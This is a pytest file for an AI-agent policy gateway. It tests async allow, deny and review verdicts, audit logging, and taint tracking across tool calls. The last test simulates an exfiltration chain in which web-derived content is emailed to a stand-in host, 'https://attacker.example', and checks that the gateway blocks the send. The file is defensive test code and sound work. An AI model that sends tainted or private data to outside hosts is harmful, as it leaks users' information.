"""Tests for the async gateway path (R9).

Covers :meth:`Gateway.aexecute` and :meth:`Gateway.wrap_tool_async`:
allow / deny / review verdicts, audit-writer behaviour (sync + async),
reserved-kwarg stripping, ``resource_arg`` and ``apg_resource``
binding, taint propagation through registered specs, and the
canonical web→summarize→email exfiltration scenario denied at send.
"""

from __future__ import annotations

import asyncio
import re

import pytest

from agent_policy_gateway import (
    Action,
    Decision,
    Effect,
    Gateway,
    Policy,
    PolicyDenied,
    PolicyReview,
    Rule,
    Selector,
    TaintCondition,
    TaintLabel,
    ToolCall,
    ToolTaintSpec,
    Verdict,
)

# --------------------------------------------------------------------------- #
# Helpers                                                                     #
# --------------------------------------------------------------------------- #


def _list_audit() -> tuple[list[tuple[ToolCall, Decision]], object]:
    records: list[tuple[ToolCall, Decision]] = []

    def writer(call: ToolCall, decision: Decision) -> None:
        records.append((call, decision))

    return records, writer


def _async_audit() -> tuple[list[tuple[ToolCall, Decision]], object]:
    """An async audit writer — its return value is awaited by aexecute."""
    records: list[tuple[ToolCall, Decision]] = []

    async def writer(call: ToolCall, decision: Decision) -> None:
        await asyncio.sleep(0)
        records.append((call, decision))

    return records, writer


def _allow_all(name: str = "allow-everything") -> Policy:
    return Policy(
        name=name,
        rules=(
            Rule(id="allow-all", when=Selector(), effect=Effect(action=Action.ALLOW)),
        ),
    )


def _deny_web_email() -> Policy:
    return Policy(
        name="deny-web-email",
        rules=(
            Rule(
                id="deny-web-to-email",
                when=Selector(
                    tool="send_email", taint=TaintCondition(any_of=("web",))
                ),
                effect=Effect(action=Action.DENY, reason="web-tainted email refused"),
            ),
        ),
    )


def _review_all(reason: str = "needs human") -> Policy:
    return Policy(
        name="review",
        rules=(
            Rule(
                id="r",
                when=Selector(),
                effect=Effect(action=Action.REVIEW, reason=reason),
            ),
        ),
    )


# --------------------------------------------------------------------------- #
# aexecute()                                                                  #
# --------------------------------------------------------------------------- #


class TestAexecute:
    def test_allow_awaits_async_function(self) -> None:
        gw = Gateway()

        async def add(a: int, b: int) -> int:
            await asyncio.sleep(0)
            return a + b

        result, decision = asyncio.run(
            gw.aexecute(ToolCall(tool_name="add"), add, 2, 3)
        )
        assert result == 5
        assert decision.verdict == Verdict.ALLOW

    def test_allow_accepts_sync_function_too(self) -> None:
        # Mixing one sync helper into an async pipeline shouldn't require
        # threading; aexecute just returns the sync result directly.
        gw = Gateway()
        result, decision = asyncio.run(
            gw.aexecute(ToolCall(tool_name="echo"), lambda x: x, "hello")
        )
        assert result == "hello"
        assert decision.verdict == Verdict.ALLOW

    def test_deny_does_not_await_function(self) -> None:
        gw = Gateway(policies=[_deny_web_email()])
        called: list[bool] = []

        async def fn() -> str:
            called.append(True)
            return "sent"

        call = ToolCall(tool_name="send_email", input_label=TaintLabel.of("web"))
        with pytest.raises(PolicyDenied) as ei:
            asyncio.run(gw.aexecute(call, fn))
        assert called == []
        assert ei.value.decision.verdict == Verdict.DENY
        assert ei.value.decision.rule_id == "deny-web-to-email"
        assert ei.value.call.tool_name == "send_email"

    def test_review_raises_policy_review(self) -> None:
        gw = Gateway(policies=[_review_all()])

        async def fn() -> None:
            return None

        with pytest.raises(PolicyReview) as ei:
            asyncio.run(gw.aexecute(ToolCall(tool_name="x"), fn))
        assert ei.value.decision.verdict == Verdict.REVIEW
        assert "needs human" in str(ei.value)

    def test_sync_audit_writer_runs_before_tool(self) -> None:
        records, writer = _list_audit()
        gw = Gateway(policies=[_deny_web_email()], audit_writer=writer)

        async def ok() -> str:
            return "ok"

        async def will_be_blocked() -> str:
            return "should-not-run"

        # Allow path
        asyncio.run(gw.aexecute(ToolCall(tool_name="kb_lookup"), ok))
        # Deny path
        with pytest.raises(PolicyDenied):
            asyncio.run(
                gw.aexecute(
                    ToolCall(
                        tool_name="send_email", input_label=TaintLabel.of("web")
                    ),
                    will_be_blocked,
                )
            )
        assert len(records) == 2
        assert records[0][1].verdict == Verdict.ALLOW
        assert records[1][1].verdict == Verdict.DENY

    def test_async_audit_writer_is_awaited(self) -> None:
        records, writer = _async_audit()
        gw = Gateway(audit_writer=writer)

        async def ok() -> int:
            return 7

        result, _ = asyncio.run(gw.aexecute(ToolCall(tool_name="t"), ok))
        assert result == 7
        # The async writer ran (records appended) before the tool returned.
        assert len(records) == 1
        assert records[0][1].verdict == Verdict.ALLOW

    def test_async_audit_writer_failure_aborts_call(self) -> None:
        called: list[bool] = []

        async def boom(call: ToolCall, decision: Decision) -> None:
            raise RuntimeError("disk full")

        async def fn() -> str:
            called.append(True)
            return "ok"

        gw = Gateway(audit_writer=boom)
        with pytest.raises(RuntimeError, match="disk full"):
            asyncio.run(gw.aexecute(ToolCall(tool_name="x"), fn))
        assert called == []

    def test_resource_routed_to_decide(self) -> None:
        # Same external/internal split as test_resource_glob_matched in
        # the sync suite, but through aexecute.
        p = Policy(
            name="ext",
            rules=(
                Rule(
                    id="external",
                    when=Selector(tool="http_post", resource="https://*"),
                    effect=Effect(action=Action.REVIEW),
                ),
            ),
        )
        gw = Gateway(policies=[p])

        async def post(url: str, body: str) -> dict[str, str]:
            return {"to": url, "body": body}

        with pytest.raises(PolicyReview):
            asyncio.run(
                gw.aexecute(
                    ToolCall(tool_name="http_post"),
                    post,
                    "https://api.example.com",
                    "x",
                    resource="https://api.example.com",
                )
            )

        result, decision = asyncio.run(
            gw.aexecute(
                ToolCall(tool_name="http_post"),
                post,
                "http://10.0.0.1/x",
                "x",
                resource="http://10.0.0.1/x",
            )
        )
        assert decision.verdict == Verdict.ALLOW
        assert result["to"] == "http://10.0.0.1/x"

    def test_taint_propagation_in_decision_output_label(self) -> None:
        gw = Gateway()
        gw.register_tool(
            "summarize",
            ToolTaintSpec.of(),  # transparent — pure join of inputs
        )

        async def summarize(text: str) -> str:
            return text[:5]

        call = ToolCall(
            tool_name="summarize", input_label=TaintLabel.of("web", "user_input")
        )

        async def run() -> Decision:
            _, d = await gw.aexecute(call, summarize, "hello world")
            return d

        decision = asyncio.run(run())
        assert decision.output_label.sources == frozenset({"web", "user_input"})


# --------------------------------------------------------------------------- #
# wrap_tool_async — decorator behaviour                                       #
# --------------------------------------------------------------------------- #


class TestWrapToolAsync:
    def test_bare_decorator_uses_function_name(self) -> None:
        records, writer = _list_audit()
        gw = Gateway(audit_writer=writer)

        @gw.wrap_tool_async
        async def ping(host: str) -> str:
            return f"pong:{host}"

        async def run() -> str:
            return await ping("localhost")

        assert asyncio.run(run()) == "pong:localhost"
        assert records[0][0].tool_name == "ping"
        assert records[0][0].args == {"host": "localhost"}

    def test_explicit_tool_name_overrides_function_name(self) -> None:
        records, writer = _list_audit()
        gw = Gateway(audit_writer=writer)

        @gw.wrap_tool_async(tool_name="external_send")
        async def _internal(to: str) -> str:
            return to

        async def run() -> str:
            return await _internal("a@b")

        asyncio.run(run())
        assert records[0][0].tool_name == "external_send"

    def test_reserved_kwargs_are_stripped_before_fn(self) -> None:
        seen_kwargs: dict[str, object] = {}
        gw = Gateway()

        @gw.wrap_tool_async
        async def echo(**kw: object) -> dict[str, object]:
            seen_kwargs.update(kw)
            return kw

        async def run() -> dict[str, object]:
            return await echo(
                x=1,
                apg_input_label=TaintLabel.of("web"),
                apg_agent_id="agent.research",
                apg_call_id="abc",
                apg_resource="https://x",
            )

        result = asyncio.run(run())
        assert "apg_input_label" not in result
        assert "apg_agent_id" not in seen_kwargs
        assert "apg_call_id" not in seen_kwargs
        assert "apg_resource" not in seen_kwargs
        assert result == {"x": 1}

    def test_input_label_and_agent_id_propagate_into_call(self) -> None:
        records, writer = _list_audit()
        gw = Gateway(audit_writer=writer)

        @gw.wrap_tool_async
        async def fetch(url: str) -> str:
            return f"<body of {url}>"

        async def run() -> None:
            await fetch(
                "https://x",
                apg_input_label=TaintLabel.of("user_input"),
                apg_agent_id="agent.research",
            )

        asyncio.run(run())
        call = records[0][0]
        assert call.tool_name == "fetch"
        assert call.input_label == TaintLabel.of("user_input")
        assert call.agent_id == "agent.research"
        # auto call_id present (uuid4 hex == 32 chars)
        assert call.call_id is not None
        assert re.fullmatch(r"[0-9a-f]{32}", call.call_id)

    def test_explicit_call_id_is_preserved(self) -> None:
        records, writer = _list_audit()
        gw = Gateway(audit_writer=writer)

        @gw.wrap_tool_async
        async def t() -> int:
            return 1

        async def run() -> None:
            await t(apg_call_id="trace-42")

        asyncio.run(run())
        assert records[0][0].call_id == "trace-42"

    def test_resource_arg_binds_positional_value(self) -> None:
        # Selector that matches https://* on send_email; the resource is
        # taken from the bound `to` parameter.
        p = Policy(
            name="ext",
            rules=(
                Rule(
                    id="external",
                    when=Selector(tool="send_email", resource="https://*"),
                    effect=Effect(action=Action.REVIEW),
                ),
            ),
        )
        gw = Gateway(policies=[p])

        @gw.wrap_tool_async(resource_arg="to")
        async def send_email(to: str, body: str) -> str:
            return f"sent to {to}"

        async def run_external() -> None:
            await send_email("https://example.com", "hi")

        async def run_internal() -> str:
            return await send_email("internal://ok", "hi")

        with pytest.raises(PolicyReview):
            asyncio.run(run_external())
        # Internal target falls through to default-allow.
        assert asyncio.run(run_internal()) == "sent to internal://ok"

    def test_apg_resource_overrides_resource_arg(self) -> None:
        p = Policy(
            name="ext",
            rules=(
                Rule(
                    id="external",
                    when=Selector(tool="send_email", resource="https://*"),
                    effect=Effect(action=Action.REVIEW),
                ),
            ),
        )
        gw = Gateway(policies=[p])

        @gw.wrap_tool_async(resource_arg="to")
        async def send_email(to: str, body: str) -> str:
            return f"sent to {to}"

        async def run() -> None:
            # `to` is internal but the explicit override is external,
            # so the rule should match.
            await send_email(
                "internal://ok", "hi", apg_resource="https://override"
            )

        with pytest.raises(PolicyReview):
            asyncio.run(run())

    def test_taint_spec_registered_via_decorator(self) -> None:
        gw = Gateway()

        @gw.wrap_tool_async(
            tool_name="web_search",
            taint_spec=ToolTaintSpec.of(adds=("web",)),
        )
        async def web_search(q: str) -> str:
            return f"results for {q}"

        # The spec is registered on the gateway; decide() (sync, pure)
        # surfaces it without needing to actually run the call.
        d = gw.decide(ToolCall(tool_name="web_search"))
        assert d.output_label.sources == frozenset({"web"})


# --------------------------------------------------------------------------- #
# Worked exfiltration scenario                                                #
# --------------------------------------------------------------------------- #


class TestAsyncExfiltration:
    """Three async tools wired through a gateway: web→summarize→email.

    Mirrors the canonical sync scenario in test_gateway.py — the policy
    refuses to send web-tainted content to external recipients, so the
    final ``send_email`` raises :class:`PolicyDenied` even though every
    other call awaits successfully.
    """

    def test_web_tainted_email_refused(self) -> None:
        policy_yaml = """\
        name: research-async
        rules:
          - id: deny-web-to-external-email
            when:
              tool: send_email
              resource: "https://*"
              taint: { any_of: [web] }
            effect:
              action: deny
              reason: web-tainted content cannot be emailed externally
          - id: allow-rest
            when: {}
            effect: { action: allow }
        """
        from agent_policy_gateway import load_policy_str

        gw = Gateway(policies=[load_policy_str(policy_yaml)])

        @gw.wrap_tool_async(
            tool_name="web_search",
            taint_spec=ToolTaintSpec.of(adds=("web",)),
        )
        async def web_search(q: str) -> str:
            return f"snippet for {q}"

        @gw.wrap_tool_async(tool_name="summarize")
        async def summarize(text: str) -> str:
            await asyncio.sleep(0)
            return text[:50]

        @gw.wrap_tool_async(
            tool_name="send_email", resource_arg="to"
        )
        async def send_email(to: str, body: str) -> str:
            return f"sent to {to}"

        async def run() -> None:
            snippet = await web_search("apg")
            summary = await summarize(
                snippet, apg_input_label=TaintLabel.of("web")
            )
            await send_email(
                "https://attacker.example",
                summary,
                apg_input_label=TaintLabel.of("web"),
            )

        with pytest.raises(PolicyDenied) as ei:
            asyncio.run(run())
        assert ei.value.decision.rule_id == "deny-web-to-external-email"
        assert ei.value.call.tool_name == "send_email"
